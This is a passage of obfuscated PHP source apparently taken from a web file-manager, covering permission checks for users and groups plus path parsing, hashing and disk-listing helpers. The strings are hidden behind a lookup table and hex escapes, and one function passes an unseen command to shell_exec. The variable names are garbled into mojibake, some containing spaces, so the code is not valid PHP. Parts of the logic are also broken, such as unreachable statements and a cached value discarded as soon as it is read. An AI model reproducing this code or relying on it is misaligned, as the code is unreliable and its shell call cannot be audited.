authFolderOwnerGroup($ÊòœŠÕ) { $ªè©Áíï =& $_SERVER[³à¼î¯á]; $õ”„Ø‰ = Model($ªè©Áíï[2047])->where(array($ªè©Áíï[1952] => $ÊòœŠÕ))->select(); $ã»ò‹†Ã = array(); if (!$õ”„Ø‰) { return $ã»ò‹†Ã; } foreach ($õ”„Ø‰ as $ˆ¶Â›ê—) { $Òúì†Õ³ = $this->authInfo($ˆ¶Â›ê—); if (AuthModel::authCheckRoot($Òúì†Õ³[$ªè©Áíï[462]])) { $ã»ò‹†Ã[] = $ˆ¶Â›ê—[$ªè©Áíï[1753]]; } } return $ã»ò‹†Ã; } private function authFolderOwnerUser($å«®¿ÜÙ) { $ìÊİìĞõ =& $_SERVER[³à¼î¯á]; $È·òÚÆ‘ = array(); $İù£Çæ = !1; foreach ($å«®¿ÜÙ as $ˆ£òÊ½) { $—ÒÈ´˜† = $this->authInfo($ˆ£òÊ½); if ($ˆ£òÊ½[$ìÊİìĞõ[545]] == $ìÊİìĞõ[219]) { $İù£Çæ = !0; } if ($ˆ£òÊ½[$ìÊİìĞõ[181]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($—ÒÈ´˜†[$ìÊİìĞõ[462]])) { $È·òÚÆ‘[] = $ˆ£òÊ½[$ìÊİìĞõ[545]]; } } } return array($ìÊİìĞõ[637] => $È·òÚÆ‘, $ìÊİìĞõ[2168] => $İù£Çæ); } public function authMake($€¸¹óÔØ, $ö¡³Î¦ = false) { $œŞş‡Ôº =& $_SERVER[³à¼î¯á]; $Çú”©µâ = $this->authArrayCheck($€¸¹óÔØ, $ö¡³Î¦); if ($Çú”©µâ[$œŞş‡Ôº[2170]]) { $Çú”©µâ[$œŞş‡Ôº[2170]] = $this->sourceAuthInfo($Çú”©µâ[$œŞş‡Ôº[2170]]); } return $Çú”©µâ; } public function authArrayCheck($»„ÈÔ‘ü, $áÖ…£Ùø = false) { $Ò“£ü³œ =& $_SERVER[³à¼î¯á]; if (!$»„ÈÔ‘ü) { return array($Ò“£ü³œ[463] => 0, $Ò“£ü³œ[515] => !1); } $áÖ…£Ùø = $áÖ…£Ùø ? $áÖ…£Ùø : USER_ID; $áæ¢ôÚ“ = 0; $´Ô©ìåí = 0; $âÓ©…è = 0; $¨º›¤Îí = 0; $ÑÑˆ—Ù = 0; $°œ¿Üæß = 0; $ÊËëê€˜ = 1000; $»§õæœà = 0; $Ç³Ñšëå = 0; $Æş¦œË = 0; $‘Âà¿€ª = 0; $ÊµÊóÙÏ = array($Ò“£ü³œ[184] => 0); foreach ($»„ÈÔ‘ü as $ÊµÊóÙÏ) { $Ô€š†û = $this->authInfo($ÊµÊóÙÏ); if (!$Ô€š†û) { continue; } $·øŞÆ•¢ = $ÊµÊóÙÏ[$Ò“£ü³œ[545]]; $ÚÌ…¥¼ = intval($Ô€š†û[$Ò“£ü³œ[462]]); if ($ÊµÊóÙÏ[$Ò“£ü³œ[181]] == SourceModel::TYPE_USER && $·øŞÆ•¢ == $áÖ…£Ùø) { $áæ¢ôÚ“ = !0; $âÓ©…è = $Ô€š†û; $´Ô©ìåí = $ÚÌ…¥¼; } else { if ($ÊµÊóÙÏ[$Ò“£ü³œ[181]] == SourceModel::TYPE_GROUP && $this->groupContainUser($·øŞÆ•¢, $áÖ…£Ùø)) { $¨º›¤Îí = !0; $Ä’Ï„üÓ = $this->groupStepToUserGroup($·øŞÆ•¢, $áÖ…£Ùø); if ($Ä’Ï„üÓ < $ÊËëê€˜) { $ÊËëê€˜ = $Ä’Ï„üÓ; $ÑÑˆ—Ù = $ÚÌ…¥¼; $°œ¿Üæß = $Ô€š†û; $»§õæœà = $·øŞÆ•¢; } if ($Ä’Ï„üÓ == $ÊËëê€˜ && $ÚÌ…¥¼ >= $ÑÑˆ—Ù) { $ÑÑˆ—Ù = $ÚÌ…¥¼; $°œ¿Üæß = $Ô€š†û; $»§õæœà = $·øŞÆ•¢; } } else { if ($·øŞÆ•¢ == $Ò“£ü³œ[219]) { $Ç³Ñšëå = !0; $‘Âà¿€ª = $Ô€š†û; $Æş¦œË = $ÚÌ…¥¼; } } } } if ($áæ¢ôÚ“) { $ùù´ƒò˜ = $´Ô©ìåí; $Ô€š†û = $âÓ©…è; $øÌÏ—µ® = LNG($Ò“£ü³œ[2171]); } else { if ($¨º›¤Îí) { $ùù´ƒò˜ = $ÑÑˆ—Ù; $Ô€š†û = $°œ¿Üæß; $·¼µœÉğ = Model($Ò“£ü³œ[561])->getInfo($»§õæœà); $øÌÏ—µ® = $Ò“£ü³œ[166] . $·¼µœÉğ[$Ò“£ü³œ[565]] . $Ò“£ü³œ[2172] . LNG($Ò“£ü³œ[2173]); } else { if ($Ç³Ñšëå) { $ùù´ƒò˜ = $Æş¦œË; $Ô€š†û = $‘Âà¿€ª; $øÌÏ—µ® = LNG($Ò“£ü³œ[2143]); } else { $ùù´ƒò˜ = 0; $Ô€š†û = !1; $øÌÏ—µ® = $Ò“£ü³œ[12]; } } } $ãëƒŞŞÕ = array($Ò“£ü³œ[2163] => intval($ùù´ƒò˜), $Ò“£ü³œ[2146] => $Ô€š†û, $Ò“£ü³œ[2164] => $øÌÏ—µ®, $Ò“£ü³œ[2155] => $ÊµÊóÙÏ[$Ò“£ü³œ[184]]); return $ãëƒŞŞÕ; } private function groupContainUser($è÷²ù”û, $šŠãÏÌ» = false) { return in_array($è÷²ù”û, $this->userGroupParents($šŠãÏÌ»)); } private function groupStepToUserGroup($•Í©ÂÆ, $—äñ£ = false) { $ÎÇ‰Üş =& $_SERVER[³à¼î¯á]; $˜º¡ôø§ = $this->userGroupList($—äñ£); $­’ŠÕØ = 1000; $‡ºş‚ñ = $GLOBALS[$ÎÇ‰Üş[6]][$ÎÇ‰Üş[92]][$ÎÇ‰Üş[2060]] == 1; $ĞÄÑûê‘ = $‡ºş‚ñ ? 3 : 2; foreach ($˜º¡ôø§ as $©Èı€°‹) { if ($©Èı€°‹[$ÎÇ‰Üş[1952]] == $•Í©ÂÆ) { return 0; } $ÑÂËÎ”± = explode($ÎÇ‰Üş[50], trim($©Èı€°‹[$ÎÇ‰Üş[560]], $ÎÇ‰Üş[50])); if ($ÑÂËÎ”±[0] == $ÎÇ‰Üş[219] && count($ÑÂËÎ”±) > $ĞÄÑûê‘) { $¥’şÃ”š = array_reverse(array_slice($ÑÂËÎ”±, $ĞÄÑûê‘)); $·¶ÙÍ¯ô = array_search($•Í©ÂÆ, $¥’şÃ”š); if ($·¶ÙÍ¯ô !== !1 && $·¶ÙÍ¯ô + 1 <= $­’ŠÕØ) { $­’ŠÕØ = $·¶ÙÍ¯ô + 1; } } } return $­’ŠÕØ; } private function userGroupList($âÉÄ‡­ = false) { $¬¡šıê÷ =& $_SERVER[³à¼î¯á]; static $ší×Şšà = array(); if (isset($ší×Şšà[$âÉÄ‡­])) { return $ší×Şšà[$âÉÄ‡­]; } $«ŞÍ½Å™ = Model($¬¡šıê÷[574])->getInfo($âÉÄ‡­); $ší×Şšà[$âÉÄ‡­] = array_to_keyvalue($«ŞÍ½Å™[$¬¡šıê÷[2144]], $¬¡šıê÷[1952]); return $ší×Şšà[$âÉÄ‡­]; } public function userGroupParents($ûŸØÖÈ°) { $ƒ¦Ìï·­ =& $_SERVER[³à¼î¯á]; static $©àèé§’ = array(); $ûŸØÖÈ° = $ûŸØÖÈ° ? $ûŸØÖÈ° : USER_ID; if (isset($©àèé§’[$ûŸØÖÈ°])) { return $©àèé§’[$ûŸØÖÈ°]; } $¨Æ»Šƒé = $this->userGroupList($ûŸØÖÈ°); $ëÆ•Òµ† = array(); $˜›ÌŸ³æ = $GLOBALS[$ƒ¦Ìï·­[6]][$ƒ¦Ìï·­[92]][$ƒ¦Ìï·­[2060]] == 1; $×™î¦Á† = $˜›ÌŸ³æ ? 3 : 2; foreach ($¨Æ»Šƒé as $è´¾¿è) { $¸‘›˜æ¼ = array($è´¾¿è[$ƒ¦Ìï·­[1952]]); $ªõõ¨¤Ë = explode($ƒ¦Ìï·­[50], trim($è´¾¿è[$ƒ¦Ìï·­[560]], $ƒ¦Ìï·­[50])); if ($ªõõ¨¤Ë[0] == $ƒ¦Ìï·­[219] && count($ªõõ¨¤Ë) > $×™î¦Á†) { $ »œÏş– = array_slice($ªõõ¨¤Ë, $×™î¦Á†); $¸‘›˜æ¼ = array_merge($¸‘›˜æ¼, array_reverse($ »œÏş–)); } $ëÆ•Òµ† = array_merge($ëÆ•Òµ†, $¸‘›˜æ¼); } $©àèé§’[$ûŸØÖÈ°] = array_unique($ëÆ•Òµ†); return $©àèé§’[$ûŸØÖÈ°]; } public function authTargetInfoMake($æÎî•ì¢) { $Ãğñ£Ş =& $_SERVER[³à¼î¯á]; $»‚¿à = array(); $ÅÄØş‰¦ = array(); foreach ($æÎî•ì¢ as $ã·¸ò‚†) { if ($ã·¸ò‚†[$Ãğñ£Ş[181]] == SourceModel::TYPE_USER) { $»‚¿à[] = intval($ã·¸ò‚†[$Ãğñ£Ş[545]]); } else { if ($ã·¸ò‚†[$Ãğñ£Ş[181]] == SourceModel::TYPE_GROUP) { $ÅÄØş‰¦[] = intval($ã·¸ò‚†[$Ãğñ£Ş[545]]); } } } if ($»‚¿à) { $»‚¿à = Model($Ãğñ£Ş[553])->userListInfo($»‚¿à); } if ($ÅÄØş‰¦) { $ˆáÌ¹ß‡ = array($Ãğñ£Ş[2045] => array($Ãğñ£Ş[467], $ÅÄØş‰¦)); $ÅÄØş‰¦ = Model($Ãğñ£Ş[561])->field($Ãğñ£Ş[2174])->where($ˆáÌ¹ß‡)->select(); $ÅÄØş‰¦ = array_to_keyvalue($ÅÄØş‰¦, $Ãğñ£Ş[1952]); } return array($Ãğñ£Ş[2175] => $»‚¿à, $Ãğñ£Ş[2176] => $ÅÄØş‰¦); } public function authInfo($½…«´«›) { $–Ò´éàû =& $_SERVER[³à¼î¯á]; if ($½…«´«›[$–Ò´éàû[2061]]) { $«€åíß° = Model($–Ò´éàû[547])->listData($½…«´«›[$–Ò´éàû[2061]]); if (!$«€åíß°) { return !1; $çáíø—Ø = Model($–Ò´éàû[547])->listData(); $Êºä³ğ = array_filter_by_field($çáíø—Ø, $–Ò´éàû[462], $–Ò´éàû[219]); return $Êºä³ğ; } $ğçÔ¶¶‹ = array_field_key($«€åíß°, array($–Ò´éàû[450], $–Ò´éàû[32], $–Ò´éàû[462], $–Ò´éàû[1975], $–Ò´éàû[1976])); $ğçÔ¶¶‹[$–Ò´éàû[2177]] = $½…«´«›; return $ğçÔ¶¶‹; } else { return array($–Ò´éàû[468] => 0, $–Ò´éàû[1958] => $½…«´«›[$–Ò´éàû[2121]], $–Ò´éàû[469] => $–Ò´éàû[12], $–Ò´éàû[1975] => $–Ò´éàû[2178]); } } } goto C‘çÕ‚Ÿ; b‹„ïñ¬Ê—: class KodIO { const KOD_SOURCE = "\173\163\x6f\165\x72\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\122\145\x63\171\x63\154\145\x7d"; const KOD_USER_FAV = "\173\x75\x73\x65\x72\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\106\151\154\145\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\162\x46\151\154\145\x54\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\x75\160\122\157\x6f\164\x53\145\154\146\175"; const KOD_USER_SHARE = "\173\x75\x73\x65\x72\123\x68\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\162\x53\x68\x61\162\x65\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\145\124\157\115\145\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\x72\x65\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\162\x65\x49\164\x65\155\114\151\x6e\x6b\x7d"; const KOD_SEARCH = "\173\163\x65\x61\162\x63\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\153\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\173\x75\163\x65\x72\122\x65\x6e\143\145\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\166\x65\162\x7d"; public static function typeList() { $ó«İ†˜  =& $_SERVER[³à¼î¯á]; return array($ó«İ†˜ [1305] => self::KOD_SOURCE, $ó«İ†˜ [1306] => self::KOD_USER_RECYCLE, $ó«İ†˜ [1307] => self::KOD_USER_FAV, $ó«İ†˜ [1308] => self::KOD_USER_FILE_TAG, $ó«İ†˜ [1309] => self::KOD_USER_FILE_TYPE, $ó«İ†˜ [1310] => self::KOD_GROUP_ROOT_SELF, $ó«İ†˜ [1311] => self::KOD_USER_SHARE, $ó«İ†˜ [1312] => self::KOD_USER_SHARE_LINK, $ó«İ†˜ [1313] => self::KOD_USER_SHARE_TO_ME, $ó«İ†˜ [1314] => self::KOD_SHARE_ITEM, $ó«İ†˜ [1315] => self::KOD_SHARE_LINK, $ó«İ†˜ [1316] => self::KOD_SEARCH, $ó«İ†˜ [1317] => self::KOD_BLOCK, $ó«İ†˜ [1318] => self::KOD_IO, $ó«İ†˜ [1319] => self::KOD_USER_RECENT, $ó«İ†˜ [1320] => self::KOD_USER_DRIVER); } public static function parse($ãë ßßß) { $Î¾´éˆÍ =& $_SERVER[³à¼î¯á]; $ãë ßßß = self::clear($ãë ßßß); $­Ì•½»¥ = array_values(self::typeList()); preg_match($Î¾´éˆÍ[1321], $ãë ßßß, $†Åí¾„); $ïıÌ›— = array($Î¾´éˆÍ[471] => !1, $Î¾´éˆÍ[1322] => !1, $Î¾´éˆÍ[468] => !1, $Î¾´éˆÍ[87] => $ãë ßßß, $Î¾´éˆÍ[1223] => !1, $Î¾´éˆÍ[1222] => $Î¾´éˆÍ[12]); if (is_array($†Åí¾„) && count($†Åí¾„) == 5) { $ü½˜ÂúÄ = $Î¾´éˆÍ[1323] . $†Åí¾„[2] . $Î¾´éˆÍ[378]; if (in_array($ü½˜ÂúÄ, $­Ì•½»¥)) { $ïıÌ›—[$Î¾´éˆÍ[1223]] = $†Åí¾„[1]; $ïıÌ›—[$Î¾´éˆÍ[33]] = $ü½˜ÂúÄ; $ïıÌ›—[$Î¾´éˆÍ[1324]] = substr($ü½˜ÂúÄ, 1, -1); $ïıÌ›—[$Î¾´éˆÍ[450]] = $†Åí¾„[3]; } $ïıÌ›—[$Î¾´éˆÍ[1222]] = $†Åí¾„[4]; } $àïÁûª = array($Î¾´éˆÍ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ïıÌ›—[$Î¾´éˆÍ[1287]] = in_array($ïıÌ›—[$Î¾´éˆÍ[33]], $àïÁûª); return $ïıÌ›—; } public static function isTruePath($âØä—Ùï) { $Œ§Çç”” =& $_SERVER[³à¼î¯á]; if (substr($âØä—Ùï, 0, 1) != $Œ§Çç””[1323]) { return !0; } if (strpos($âØä—Ùï, $Œ§Çç””[458]) === 0) { return !0; } if (strpos($âØä—Ùï, $Œ§Çç””[1291]) === 0) { return !0; } if (strpos($âØä—Ùï, $Œ§Çç””[1325]) === 0) { return !0; } if (strpos($âØä—Ùï, $Œ§Çç””[1326]) === 0) { return !0; } if (strpos($âØä—Ùï, $Œ§Çç””[1327]) === 0) { return !0; } return !1; } public static function clear($Â¬ì÷¢¾) { $¸î¸Î×Í =& $_SERVER[³à¼î¯á]; $Â¬ì÷¢¾ = str_replace(array($¸î¸Î×Í[1129], $¸î¸Î×Í[253]), $¸î¸Î×Í[53], $Â¬ì÷¢¾); $Â¬ì÷¢¾ = str_replace($¸î¸Î×Í[100], $¸î¸Î×Í[8], $Â¬ì÷¢¾); $õá¡ÍÁÌ = $¸î¸Î×Í[1328]; if (substr($Â¬ì÷¢¾, 0, 3) == $¸î¸Î×Í[1329]) { $Â¬ì÷¢¾ = substr($Â¬ì÷¢¾, 3); } while (strstr($Â¬ì÷¢¾, $õá¡ÍÁÌ)) { $Â¬ì÷¢¾ = str_replace($õá¡ÍÁÌ, $¸î¸Î×Í[8], $Â¬ì÷¢¾); } $Â¬ì÷¢¾ = preg_replace($¸î¸Î×Í[1330], $¸î¸Î×Í[8], $Â¬ì÷¢¾); if ($Â¬ì÷¢¾ == $¸î¸Î×Í[8]) { return $¸î¸Î×Í[8]; } $Â¬ì÷¢¾ = rtrim($Â¬ì÷¢¾, $¸î¸Î×Í[8]); return $Â¬ì÷¢¾; } public static function pathTrue($‹ÉçÏ˜) { $Æ‰ÎÀòß =& $_SERVER[³à¼î¯á]; if (!$‹ÉçÏ˜) { return $Æ‰ÎÀòß[12]; } $‹ÉçÏ˜ = str_replace($Æ‰ÎÀòß[568], $Æ‰ÎÀòß[8], str_replace($Æ‰ÎÀòß[1331], $Æ‰ÎÀòß[8], $‹ÉçÏ˜)); $‹ÉçÏ˜ = str_replace($Æ‰ÎÀòß[568], $Æ‰ÎÀòß[8], str_replace($Æ‰ÎÀòß[1331], $Æ‰ÎÀòß[8], $‹ÉçÏ˜)); if (!strstr($‹ÉçÏ˜, $Æ‰ÎÀòß[1329])) { return $‹ÉçÏ˜; } $ÖÄ•–ŞŠ = explode($Æ‰ÎÀòß[8], $‹ÉçÏ˜); foreach ($ÖÄ•–ŞŠ as $±îí‹Ğ’ => $¹è—È´µ) { if ($¹è—È´µ !== $Æ‰ÎÀòß[1332]) { continue; } for ($ÌÈĞì¾÷ = $±îí‹Ğ’; $ÌÈĞì¾÷ >= 0; $ÌÈĞì¾÷--) { if ($ÖÄ•–ŞŠ[$ÌÈĞì¾÷] === $Æ‰ÎÀòß[10] || $ÖÄ•–ŞŠ[$ÌÈĞì¾÷] === $Æ‰ÎÀòß[1332] || $ÖÄ•–ŞŠ[$ÌÈĞì¾÷] === -1) { continue; } if ($ÖÄ•–ŞŠ[$ÌÈĞì¾÷] === $Æ‰ÎÀòß[12]) { $ÖÄ•–ŞŠ[$±îí‹Ğ’] = -1; break; } $ÖÄ•–ŞŠ[$±îí‹Ğ’] = -1; $ÖÄ•–ŞŠ[$ÌÈĞì¾÷] = -1; break; } } $éÏ»ÚŞ‡ = array(); foreach ($ÖÄ•–ŞŠ as $¹è—È´µ) { if ($¹è—È´µ !== -1) { $éÏ»ÚŞ‡[] = $¹è—È´µ; } } $¡ÌÃ¢À® = implode($Æ‰ÎÀòß[8], $éÏ»ÚŞ‡); if (strpos($¡ÌÃ¢À®, $Æ‰ÎÀòß[1333]) === 0) { $¡ÌÃ¢À® = $Æ‰ÎÀòß[1329] . substr($¡ÌÃ¢À®, strlen($Æ‰ÎÀòß[1333])); } return $¡ÌÃ¢À®; } public static function sourceID($—ğµöÅë) { $³È³÷¯Œ =& $_SERVER[³à¼î¯á]; $éƒÀì£ = self::parse($—ğµöÅë); if ($éƒÀì£[$³È³÷¯Œ[33]] !== self::KOD_SOURCE) { show_json(LNG($³È³÷¯Œ[1334]), !1); } return $éƒÀì£[$³È³÷¯Œ[450]]; } public static function make($—ì‘Öé¥) { if (!$—ì‘Öé¥) { return !1; } return self::makePath(self::KOD_SOURCE, intval($—ì‘Öé¥)); } public static function makeShare($ì‚•Ï“Õ, $×È»ş‹) { return self::makePath(self::KOD_SHARE_ITEM, $ì‚•Ï“Õ, $×È»ş‹); } public static function makeFileTypePath($ê»˜ñëÀ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ê»˜ñëÀ); } public static function makeFileTagPath($¬ˆ™“â£) { return self::makePath(self::KOD_USER_FILE_TAG, $¬ˆ™“â£); } public static function makePath($ğ±¸øò­, $‘é¢÷ßÃ = '', $õá¹¿€’ = '') { $ò›••» =& $_SERVER[³à¼î¯á]; $ÖæÑ©÷“ = substr($ğ±¸øò­, 1, -1); $´¼ã°‚Ì = $ò›••»[1335] . $ÖæÑ©÷“ . $ò›••»[1336] . $‘é¢÷ßÃ . $ò›••»[1337]; $´¼ã°‚Ì = $õá¹¿€’ ? $´¼ã°‚Ì . $õá¹¿€’ . $ò›••»[8] : $´¼ã°‚Ì; return $´¼ã°‚Ì; } public static function hashPath($òÛÙï÷ö, $ÕŞ­–› = true) { $æî°’Ù =& $_SERVER[³à¼î¯á]; $÷İı•‡İ = is_array($òÛÙï÷ö) ? $òÛÙï÷ö : IO::info($òÛÙï÷ö); $–·²‰—ˆ = _get($÷İı•‡İ, $æî°’Ù[1338], $æî°’Ù[12]); if (!$–·²‰—ˆ && isset($÷İı•‡İ[$æî°’Ù[226]])) { $–·²‰—ˆ = trim($÷İı•‡İ[$æî°’Ù[226]], $æî°’Ù[121]); } if (!$–·²‰—ˆ && isset($÷İı•‡İ[$æî°’Ù[184]]) && $÷İı•‡İ[$æî°’Ù[184]]) { $÷İı•‡İ = IO::info(KodIO::make($÷İı•‡İ[$æî°’Ù[184]])); $–·²‰—ˆ = _get($÷İı•‡İ, $æî°’Ù[1338], $æî°’Ù[12]); } $éÛ¡›£ = md5($÷İı•‡İ[$æî°’Ù[87]] . $÷İı•‡İ[$æî°’Ù[79]] . $÷İı•‡İ[$æî°’Ù[88]]); if (!$–·²‰—ˆ && file_exists($÷İı•‡İ[$æî°’Ù[87]])) { $–·²‰—ˆ = Cache::get($éÛ¡›£ . $æî°’Ù[1339]); $–·²‰—ˆ = !1; if (!$–·²‰—ˆ) { $–·²‰—ˆ = IO::hashSimple($÷İı•‡İ[$æî°’Ù[87]]); Cache::set($éÛ¡›£ . $æî°’Ù[1339], $–·²‰—ˆ, 3600 * 24 * 30); } } if ($ÕŞ­–› && !$–·²‰—ˆ) { } return $–·²‰—ˆ ? $–·²‰—ˆ : $éÛ¡›£; } public static function hashPathSafe($ëáİ×¨ó, $‚³Ößµ = true) { $óõˆêÈ¬ =& $_SERVER[³à¼î¯á]; $­àÓßöÓ = self::hashPath($ëáİ×¨ó, $‚³Ößµ); return md5($­àÓßöÓ . $óõˆêÈ¬[1340] . Model($óõˆêÈ¬[815])->get($óõˆêÈ¬[816])); } public static function initSystemPath() { $é‰½Üà =& $_SERVER[³à¼î¯á]; if (defined($é‰½Üà[1341])) { return; } define($é‰½Üà[1341], self::systemPath($é‰½Üà[182])); define($é‰½Üà[1342], self::systemPath($é‰½Üà[1343])); define($é‰½Üà[1344], self::systemPath($é‰½Üà[1345])); define($é‰½Üà[1346], self::systemPath($é‰½Üà[1347])); IOHistory::bindEvent(); } public static function systemPath($§‘øå) { $Ú¬íŸäƒ =& $_SERVER[³à¼î¯á]; $äàêŠ†‰ = $Ú¬íŸäƒ[1348] . ucfirst($§‘øå); $£Ó…ƒ¡‡ = Model($Ú¬íŸäƒ[815])->get($äàêŠ†‰); if ($£Ó…ƒ¡‡) { return $£Ó…ƒ¡‡; } if ($§‘øå == $Ú¬íŸäƒ[182]) { $£Ó…ƒ¡‡ = self::make(Model($Ú¬íŸäƒ[869])->systemRootPathAdd($Ú¬íŸäƒ[581])); } else { $£Ó…ƒ¡‡ = self::systemPath($Ú¬íŸäƒ[182]); $Ñ®µæË£ = self::sourceID($£Ó…ƒ¡‡); $£Ó…ƒ¡‡ = self::make(Model($Ú¬íŸäƒ[869])->mkdir($Ñ®µæË£, $§‘øå)); } Model($Ú¬íŸäƒ[815])->set($äàêŠ†‰, $£Ó…ƒ¡‡); return $£Ó…ƒ¡‡; } public static function systemFolder($ï¦ ç°‹) { $ÏæµÚˆÕ = IO_PATH_SYSTEM_SOURCE . $ï¦ ç°‹; $­‹ĞËÔ´ = Cache::get($ÏæµÚˆÕ); if (!$­‹ĞËÔ´) { $İæÂÎğ = IO::infoFullSimple($ÏæµÚˆÕ); if (!$İæÂÎğ) { $­‹ĞËÔ´ = IO::mkdir($ÏæµÚˆÕ, REPEAT_SKIP); } else { $­‹ĞËÔ´ = $İæÂÎğ[$_SERVER[³à¼î¯á][87]]; } Cache::set($ÏæµÚˆÕ, $­‹ĞËÔ´, 3600 * 10); } return $­‹ĞËÔ´; } public static function defaultDriver() { return Model($_SERVER[³à¼î¯á][812])->defaultDriver(); } public static function defaultIO() { $‘âÀ°è¶ =& $_SERVER[³à¼î¯á]; $¬¡»£á® = self::defaultDriver(); return $‘âÀ°è¶[1349] . $¬¡»£á®[$‘âÀ°è¶[450]] . $‘âÀ°è¶[1337]; } public static function defaultDriverInit() { static $º±›…ŠÌ = false; if ($º±›…ŠÌ) { return $º±›…ŠÌ; } $º±›…ŠÌ = IO::init(self::defaultIO()); return $º±›…ŠÌ; } public static function fileTypeList() { $€¢İÑõ„ =& $_SERVER[³à¼î¯á]; $õ€ùö£ = $GLOBALS[$€¢İÑõ„[6]][$€¢İÑõ„[1350]]; foreach ($õ€ùö£ as $úàÄ±ßª => $Æ—´ÇóŞ) { $¾áÇÁ³Ë = $€¢İÑõ„[1351] . $úàÄ±ßª; $†¾ç·ˆ¸ = LNG($¾áÇÁ³Ë); if ($¾áÇÁ³Ë != $†¾ç·ˆ¸) { $õ€ùö£[$úàÄ±ßª][$€¢İÑõ„[32]] = $†¾ç·ˆ¸; } } return $õ€ùö£; } public static function diskList($¸¦…ÅÕà = true) { $êş¢â¡Ú = $_SERVER[³à¼î¯á][1352]; if ($¸¦…ÅÕà) { $üí¹˜±Ö = Cache::get($êş¢â¡Ú); if (is_array($üí¹˜±Ö)) { return $üí¹˜±Ö; } } $üí¹˜±Ö = self::diskListGet(); Cache::set($êş¢â¡Ú, $üí¹˜±Ö, 60); return $üí¹˜±Ö; } public static function diskListGet() { $ûÊ˜±ü =& $_SERVER[³à¼î¯á]; $ú›Úˆ­Ÿ = array(); if ($GLOBALS[$ûÊ˜±ü[6]][$ûÊ˜±ü[1353]] == $ûÊ˜±ü[1354]) { $îåŠÔ›® = $ûÊ˜±ü[1355]; for ($½Šé´¬Ş = 0; $½Šé´¬Ş < strlen($îåŠÔ›®); $½Šé´¬Ş++) { $å¹ğ¿Ñõ = $îåŠÔ›®[$½Šé´¬Ş] . $ûÊ˜±ü[1356]; if (file_exists($å¹ğ¿Ñõ)) { $ú›Úˆ­Ÿ[] = $å¹ğ¿Ñõ; } } return $ú›Úˆ­Ÿ; } if (!function_exists($ûÊ˜±ü[101])) { $ú›Úˆ­Ÿ[] = $ûÊ˜±ü[880]; return $ú›Úˆ­Ÿ; } $‰”ï¢„  = explode($ûÊ˜±ü[253], shell_exec($ûÊ˜±ü[1357])); array_shift($‰”ï¢„ ); array_pop($‰”ï¢„ ); $ò‹†úÙÙ = array($ûÊ˜±ü[1358], $ûÊ˜±ü[1359], $ûÊ˜±ü[1360], $ûÊ˜±ü[1361], $ûÊ˜±ü[1362], $ûÊ˜±ü[1363], $ûÊ˜±ü[1364], $ûÊ˜±ü[1365]); foreach ($‰”ï¢„  as $¾ùÆ³ó) { $ë¾Ö—Øñ = preg_split($ûÊ˜±ü[1366], $¾ùÆ³ó); $å¹ğ¿Ñõ = $ë¾Ö—Øñ[count($ë¾Ö—Øñ) - 1]; if (!strstr($ë¾Ö—Øñ[0], $ûÊ˜±ü[1367]) || !$å¹ğ¿Ñõ) { continue; } $§Ë¿«Ÿã = rtrim($å¹ğ¿Ñõ, $ûÊ˜±ü[8]) . $ûÊ˜±ü[8]; if (in_array($§Ë¿«Ÿã, $ò‹†úÙÙ)) { continue; } $ú›Úˆ­Ÿ[] = $§Ë¿«Ÿã; } return $ú›Úˆ­Ÿ; } public static function isSameDisk($äÒàÙÈ, $™Ç–“‰É) { $Ÿ‚§«ë =& $_SERVER[³à¼î¯á]; if ($GLOBALS[$Ÿ‚§«ë[6]][$Ÿ‚§«ë[1353]] == $Ÿ‚§«ë[1354]) { return strtolower(substr($äÒàÙÈ, 0, 1)) == strtolower(substr($™Ç–“‰É, 0, 1)); } $ÇÕÙ²²ô = self::diskList(); $›å±å›ó = !1; $ŞŞÃÉ¿ = !1; sort($ÇÕÙ²²ô); $ÇÕÙ²²ô = array_reverse($ÇÕÙ²²ô); $äÒàÙÈ = rtrim($äÒàÙÈ, $Ÿ‚§«ë[8]) . $Ÿ‚§«ë[8]; $™Ç–“‰É = rtrim($™Ç–“‰É, $Ÿ‚§«ë[8]) . $Ÿ‚§«ë[8]; foreach ($ÇÕÙ²²ô as $°ëú¶ßÎ) { $€¶Õå¿È = strlen($°ëú¶ßÎ); if (!$›å±å›ó && substr($äÒàÙÈ, 0, $€¶Õå¿È) == $°ëú¶ßÎ) { $›å±å›ó = $°ëú¶ßÎ; } if (!$ŞŞÃÉ¿ && substr($™Ç–“‰É, 0, $€¶Õå¿È) == $°ëú¶ßÎ) { $ŞŞÃÉ¿ = $°ëú¶ßÎ; } if ($›å±å›ó && $ŞŞÃÉ¿) { break; } } return $›å±å›ó === $ŞŞÃÉ¿; } public static function transferType($¬öÚğ‘¯, $šƒÓâ†ª) { $âÍŸ–ÔÈ =& $_SERVER[³à¼î¯á]; $Ñœ‚Ğ‹ = self::driverType($¬öÚğ‘¯); $…óà¶ºç = self::driverType($šƒÓâ†ª); if ($Ñœ‚Ğ‹[$âÍŸ–ÔÈ[33]] == $…óà¶ºç[$âÍŸ–ÔÈ[33]] && $Ñœ‚Ğ‹[$âÍŸ–ÔÈ[1368]] == $…óà¶ºç[$âÍŸ–ÔÈ[1368]]) { return $âÍŸ–ÔÈ[1369]; } if ($Ñœ‚Ğ‹[$âÍŸ–ÔÈ[33]] == $âÍŸ–ÔÈ[913] && $…óà¶ºç[$âÍŸ–ÔÈ[33]] == $âÍŸ–ÔÈ[109]) { return $âÍŸ–ÔÈ[1248]; } if ($Ñœ‚Ğ‹[$âÍŸ–ÔÈ[33]] == $âÍŸ–ÔÈ[109] && $…óà¶ºç[$âÍŸ–ÔÈ[33]] == $âÍŸ–ÔÈ[913]) { return 